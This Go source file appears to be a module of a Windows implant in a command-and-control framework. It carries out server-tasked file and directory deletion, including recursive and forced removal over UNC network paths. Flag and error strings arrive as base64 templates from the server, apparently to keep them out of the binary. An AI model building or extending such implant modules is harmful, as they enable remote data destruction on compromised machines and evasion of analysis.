// server/docker/payloads/Windows/action_rm.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// RmTemplate receives string templates from server
type RmTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// RM template indices (must match server's common.go)
const (
	// Flags (short form - server transforms long flags before sending)
	idxRmFlagRecursive = 240 // -r
	idxRmFlagForce     = 241 // -f

	// Error patterns (for parseRemovalError)
	idxRmErrPermDenied   = 242 // permission denied
	idxRmErrDirNotEmpty  = 243 // directory not empty
	idxRmErrResourceBusy = 244 // resource busy
	idxRmErrNotExist     = 245 // does not exist
	idxRmErrIsDirectory  = 246 // is a directory
)

// RmCommand handles file and directory removal
type RmCommand struct {
	tpl *RmTemplate
}

// getTpl safely retrieves a template string by index
func (c *RmCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
	if err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	c.tpl = &RmTemplate{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Check if no arguments provided
	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get flag strings from template
	flagRecursive := c.getTpl(idxRmFlagRecursive) // -r
	flagForce := c.getTpl(idxRmFlagForce)         // -f

	// Parse flags
	recursive := false
	force := false
	var targets []string

	for _, arg := range args {
		// Check for combined flags like -rf or -fr
		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") {
			flagStr := strings.TrimPrefix(arg, "-")
			if strings.Contains(flagStr, "r") || strings.Contains(flagStr, "R") {
				recursive = true
			}
			if strings.Contains(flagStr, "f") {
				force = true
			}
			// Check for individual flags
			if flagStr == "r" || flagStr == "R" {
				recursive = true
			} else if flagStr == "f" {
				force = true
			}
		} else if arg == flagRecursive {
			recursive = true
		} else if arg == flagForce {
			force = true
		} else {
			// It's a target file/directory
			targets = append(targets, arg)
		}
	}

	// Check if we have any targets to remove
	if len(targets) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get current working directory from context
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	var output strings.Builder
	var errors []string
	hasErrors := false
	successCount := 0

	// Process each target
	for _, target := range targets {
		var targetPath string

		if filepath.IsAbs(target) || strings.HasPrefix(target, "\\\\") || strings.HasPrefix(target, "//") {
			targetPath = target
		} else {
			// Handle UNC paths in working directory
			if strings.HasPrefix(workingDir, "\\\\") || strings.HasPrefix(workingDir, "//") {
				workingDirNorm := strings.ReplaceAll(workingDir, "/", "\\")
				if !strings.HasSuffix(workingDirNorm, "\\") {
					workingDirNorm += "\\"
				}
				targetPath = workingDirNorm + target
			} else {
				targetPath = filepath.Join(workingDir, target)
			}
		}

		// Clean path while preserving UNC
		if strings.HasPrefix(targetPath, "\\\\") || strings.HasPrefix(targetPath, "//") {
			targetPath = strings.ReplaceAll(targetPath, "/", "\\")
			parts := strings.Split(targetPath, "\\")
			var cleanParts []string
			for _, part := range parts {
				if part != "" && part != "." {
					cleanParts = append(cleanParts, part)
				}
			}
			if len(cleanParts) >= 2 {
				targetPath = "\\\\" + strings.Join(cleanParts, "\\")
			}
		} else {
			targetPath = filepath.Clean(targetPath)
		}

		// Check if the target exists
		// MODIFIED: Use NetworkAwareStatFile instead of os.Stat
		info, err := NetworkAwareStatFile(targetPath)
		if err != nil {
			if os.IsNotExist(err) {
				if !force {
					// Only report error if not in force mode
					errors = append(errors, ErrCtx(E4, target))
					hasErrors = true
				}
				continue
			} else if os.IsPermission(err) {
				// Permission denied on stat
				errors = append(errors, ErrCtx(E3, target))
				hasErrors = true
				continue
			} else {
				// Other stat errors
				errors = append(errors, ErrCtx(E10, target))
				hasErrors = true
				continue
			}
		}

		// Check if it's a directory
		if info.IsDir() {
			if !recursive {
				errors = append(errors, ErrCtx(E6, target))
				hasErrors = true
				continue
			}

			// Remove directory recursively
			removedCount, err := c.removeAllWithDetails(targetPath, force)
			if err != nil {
				// Parse the error to provide more helpful messages
				errMsg := c.parseRemovalError(target, err)
				errors = append(errors, errMsg)
				hasErrors = true
				if removedCount > 0 {
					output.WriteString(fmt.Sprintf("P:%s|%d\n", target, removedCount))
				}
			} else {
				output.WriteString(fmt.Sprintf("D:%s|%d\n", target, removedCount))
				successCount++
			}
		} else {
			// Remove single file
			// MODIFIED: Use NetworkAwareRemove instead of os.Remove
			err = NetworkAwareRemove(targetPath)
			if err != nil {
				if os.IsPermission(err) {
					errors = append(errors, ErrCtx(E3, target))
					hasErrors = true
				} else if !force {
					errors = append(errors, ErrCtx(E11, target))
					hasErrors = true
				}
			} else {
				output.WriteString(fmt.Sprintf("F:%s\n", target))
				successCount++
			}
		}
	}

	// Prepare final output
	finalOutput := output.String()

	// Add summary if multiple targets
	if len(targets) > 1 {
		if successCount > 0 {
			finalOutput += fmt.Sprintf("\nS5:%d/%d\n", successCount, len(targets))
		}
	}

	if len(errors) > 0 {
		if finalOutput != "" {
			finalOutput += "\n"
		}
		finalOutput += strings.Join(errors, "\n")
	}

	// If no output was generated and no errors, provide a success message
	if finalOutput == "" && !hasErrors {
		finalOutput = SuccCtx(S2, targets[0])
	}

	exitCode := 0
	if hasErrors {
		exitCode = 1
	}

	return CommandResult{
		Output:      finalOutput,
		ExitCode:    exitCode,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// removeAllWithDetails recursively removes directory contents
func (c *RmCommand) removeAllWithDetails(path string, force bool) (int, error) {
	removedCount := 0

	// First, check if we can access the directory
	// MODIFIED: Use NetworkAwareOpenFile to open directory
	dir, err := NetworkAwareOpenFile(path, os.O_RDONLY, 0)
	if err != nil {
		if os.IsPermission(err) {
			return 0, fmt.Errorf(Err(E3))
		}
		return 0, err
	}

	// Read all directory entries
	entries, err := dir.Readdir(-1)
	dir.Close() // Close immediately after reading

	if err != nil {
		if os.IsPermission(err) {
			return 0, fmt.Errorf(Err(E3))
		}
		return 0, err
	}

	// Track errors during recursive deletion
	var lastError error

	// Remove all entries
	for _, entry := range entries {
		entryPath := filepath.Join(path, entry.Name())

		if entry.IsDir() {
			// Recursively remove subdirectory
			subCount, err := c.removeAllWithDetails(entryPath, force)
			removedCount += subCount

			if err != nil {
				lastError = err
				if !force {
					// In non-force mode, stop on first error
					return removedCount, fmt.Errorf(ErrCtx(E11, entry.Name()))
				}
				// In force mode, continue trying other items
			} else {
				removedCount++ // Count the subdirectory itself
			}
		} else {
			// Remove file
			// MODIFIED: Use NetworkAwareRemove instead of os.Remove
			err := NetworkAwareRemove(entryPath)
			if err != nil {
				if os.IsPermission(err) {
					lastError = fmt.Errorf(ErrCtx(E3, entry.Name()))
				} else {
					lastError = err
				}

				if !force {
					// In non-force mode, stop on first error
					return removedCount, fmt.Errorf(ErrCtx(E11, entry.Name()))
				}
				// In force mode, continue trying other items
			} else {
				removedCount++
			}
		}
	}

	// Now try to remove the empty directory
	// MODIFIED: Use NetworkAwareRemove instead of os.Remove
	err = NetworkAwareRemove(path)
	if err != nil {
		if os.IsPermission(err) {
			return removedCount, fmt.Errorf(Err(E3))
		}
		// If we couldn't remove the directory but removed some contents, report partial success
		if removedCount > 0 {
			return removedCount, fmt.Errorf(ErrCtx(E16, fmt.Sprintf("%d", removedCount)))
		}
		return removedCount, err
	}

	// If there was an error during processing but we still removed the directory,
	// report the success with a note about the error
	if lastError != nil && force {
		return removedCount, nil // In force mode, we consider it success if the directory is gone
	}

	return removedCount, nil
}

// parseRemovalError creates error codes for removal errors
func (c *RmCommand) parseRemovalError(target string, err error) string {
	errStr := err.Error()

	// Get error patterns from template
	errPermDenied := c.getTpl(idxRmErrPermDenied)
	errDirNotEmpty := c.getTpl(idxRmErrDirNotEmpty)
	errResourceBusy := c.getTpl(idxRmErrResourceBusy)

	// Check for common error patterns
	if strings.Contains(errStr, errPermDenied) || strings.Contains(errStr, E3) || os.IsPermission(err) {
		return ErrCtx(E3, target)
	}

	if strings.Contains(errStr, errDirNotEmpty) || strings.Contains(errStr, E16) {
		return ErrCtx(E16, target)
	}

	if strings.Contains(errStr, errResourceBusy) {
		return ErrCtx(E13, target)
	}

	// Default: return the original error with the target
	return ErrCtx(E11, target)
}
